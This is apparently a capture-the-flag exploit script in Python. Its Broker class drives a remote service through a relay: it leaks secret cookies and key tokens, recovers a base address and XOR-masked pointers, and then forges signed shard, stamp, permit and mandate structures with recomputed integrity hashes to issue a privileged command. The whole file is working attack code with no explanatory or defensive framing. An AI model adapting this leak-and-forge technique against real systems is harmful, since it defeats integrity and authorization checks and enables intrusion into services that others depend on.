import struct
from cl import H, rol, M64, q, put

TAG_PROBE  = 0x3445424f52504c43  # CLPROBE4
TAG_APERT  = 0x3454524550414c43  # CLAPERT4
TAG_PERMIT = 0x3454494d52455043  # CPERMIT4
TAG_MAND   = 0x34455441444e414d  # MANDATE4
TAG_SHARD  = 0x3444524148534c43  # CLSHARD4
TAG_STAMP  = 0x34504d4154534c43  # CLSTAMP4

class Broker:
    def __init__(self, relay, verbose=True):
        self.relay = relay
        self.v = verbose
        self.K1 = self.K2 = self.base = self.K0 = None

    def log(self, *a):
        if self.v: print("[broker]", *a)

    def send(self, payload, expect=None):
        st, body = self.relay(payload)
        if expect is not None and expect not in body:
            self.log("unexpected", payload[:4].hex(), st, body[:40])
        return body

    def leak_tokens(self):
        toks = {}
        for t in range(3):
            ps, asp, lk, al = 2*t, 2*t, 2*t, 2*t+1
            self.send(b"N"+bytes([ps,t]), b"PROBE")
            self.send(b"L"+bytes([ps,lk]), b"LINKED")
            body = self.send(b"P"+bytes([lk]))
            if len(body) < 0x40: self.log("probe leak fail", body); return False
            cookie_p = struct.unpack_from("<Q",body,0x18)[0]
            pb = bytearray(0x90); put(pb,0,TAG_PROBE); put(pb,8,t)
            put(pb,0x10,0x100+t); put(pb,0x18,cookie_p); put(pb,0x30,1)
            self.send(b"A"+bytes([lk])+bytes(pb), b"IMPORTED")
            self.send(b"n"+bytes([asp,t]), b"APERTURE")
            self.send(b"l"+bytes([asp,al]), b"LINKED")
            body = self.send(b"p"+bytes([al]))
            if len(body) < 0x40: self.log("aperture leak fail", body); return False
            cookie_a = struct.unpack_from("<Q",body,0x18)[0]
            ab = bytearray(0xc0); put(ab,0,TAG_APERT); put(ab,8,t)
            put(ab,0x10,0x200+t); put(ab,0x18,cookie_a); put(ab,0x30,1)
            self.send(b"a"+bytes([al])+bytes(ab), b"IMPORTED")
            self.send(b"B"+bytes([ps,asp]), b"BOUND")
            body = self.send(b"V"+bytes([lk,al]))
            self.log("V type",t,"->",body)
            if len(body) != 8: return False
            toks[t] = struct.unpack("<Q", body)[0]
        self.base = toks[0] - 0x4000
        self.K1, self.K2 = toks[1], toks[2]
        self.K0 = H(self.K1, self.K2, [self.base+0x4000, 0x4f524b4559313233], 2)
        self.log("base=%#x K1=%#x K2=%#x K0=%#x"%(self.base,self.K1,self.K2,self.K0))
        return True

    def run(self):
        K1,K2,K0,base = self.K1,self.K2,self.K0,self.base
        # ---- permit
        self.send(b"G"+bytes([0]), b"PERMIT")
        self.send(b"H"+bytes([0,0]), b"HELD")
        body = self.send(b"I"+bytes([0]))
        permit_ptr = struct.unpack_from("<Q",body,0x10)[0] ^ K1
        self.log("permit=%#x"%permit_ptr)
        # ---- mandate
        self.send(b"M"+bytes([0]), b"MANDATE")
        self.send(b"O"+bytes([0,0]), b"HELD")
        body = self.send(b"Q"+bytes([0]))
        mand_ptr = struct.unpack_from("<Q",body,0x10)[0] ^ K1
        self.log("mandate=%#x"%mand_ptr)
        # ---- shards / stamps
        shard_ptrs=[]; stamp_ptrs=[]
        for i in range(4):
            self.send(b"S"+bytes([i,i]), b"SHARD")
            self.send(b"T"+bytes([i,i]), b"TETHERED")
            body = self.send(b"U"+bytes([i]))
            shard_ptrs.append(struct.unpack_from("<Q",body,0x18)[0] ^ K1)
            self.send(b"s"+bytes([i,i]), b"STAMP")
            self.send(b"t"+bytes([i,i]), b"TETHERED")
            body = self.send(b"u"+bytes([i]))
            stamp_ptrs.append(struct.unpack_from("<Q",body,0x18)[0] ^ K1)
        self.log("shard ptrs",[hex(x) for x in shard_ptrs])
        self.log("stamp ptrs",[hex(x) for x in stamp_ptrs])
        fsh=[]; fst=[]
        for i in range(4):
            sh = bytearray(0xf0); stp = bytearray(0x130)
            sseed = 0x1000+i; tseed = 0x2000+i
            payload = bytes([0x40+i])*0xa8
            sh[0x48:0xf0] = payload
            h = H(K0, sseed, [i], 1)
            for j in range(21):
                w = struct.unpack_from("<Q",payload,8*j)[0]
                h = H(K0 ^ sseed, K1, [h,w,j*8], 3)
            put(sh,0,TAG_SHARD); put(sh,8,i); put(sh,0x10,sseed)
            put(sh,0x18,K1^shard_ptrs[i]); put(sh,0x20,K1^stamp_ptrs[i]); put(sh,0x28,tseed)
            put(sh,0x30,h); put(sh,0x38,1)
            put(sh,0x40,H(K1,K0,[q(sh,k) for k in range(0,0x40,8)],8))
            put(stp,0,TAG_STAMP); put(stp,8,i); put(stp,0x10,tseed)
            put(stp,0x18,K1^stamp_ptrs[i]); put(stp,0x20,K1^shard_ptrs[i]); put(stp,0x28,sseed)
            put(stp,0x30,h); put(stp,0x38,1)
            put(stp,0x40,H(K1^0x3c6ef372fe94f82b,K0,[q(stp,k) for k in range(0,0x40,8)],8))
            fsh.append(sh); fst.append(stp)
        for i in range(4):
            self.send(b"F"+bytes([i])+bytes(fsh[i]), b"IMPORTED")
            self.send(b"f"+bytes([i])+bytes(fst[i]), b"IMPORTED")
        # ---- permit / mandate forged
        t = 0
        h = K0
        for i in range(4):
            h = H(K0 ^ i, K1, [h, q(fsh[i],0x30), q(fsh[i],0x10),
                               q(fst[i],0x10), shard_ptrs[i], stamp_ptrs[i]], 6)
        h4 = h
        permit = bytearray(0x160)
        put(permit,0,TAG_PERMIT); put(permit,8,t); put(permit,0x10,K1^permit_ptr)
        put(permit,0x18,K1^mand_ptr); put(permit,0x20,t); put(permit,0x28,h4); put(permit,0x30,1)
        put(permit,0x38,H(K2,K1,[q(permit,k) for k in range(0,0x38,8)],7))
        mand = bytearray(0xb0)
        put(mand,0,TAG_MAND); put(mand,8,t)
        put(mand,0x10,K1^mand_ptr); put(mand,0x18,K1^permit_ptr); put(mand,0x20,t)
        target = base+0x4000
        put(mand,0x28, rol(q(permit,8) ^ mand_ptr ^ K2 ^ target, 0x13))
        put(mand,0x30, H(K2^K1, K0, [h4, permit_ptr, mand_ptr, q(permit,8), q(mand,8)], 5))
        put(mand,0x38, 1)
        put(mand,0x40, H(K2^0x13198a2e03707344, K1, [q(mand,k) for k in range(0,0x40,8)], 8))
        self.send(b"K"+bytes([0])+bytes(permit), b"IMPORTED")
        self.send(b"Y"+bytes([0])+bytes(mand), b"IMPORTED")
        cmdb = b"C"+bytes([0,0])+bytes([0,0,1,1,2,2,3,3])
        st, body = self.relay(cmdb)
        self.log("C ->", st, body)
        return body
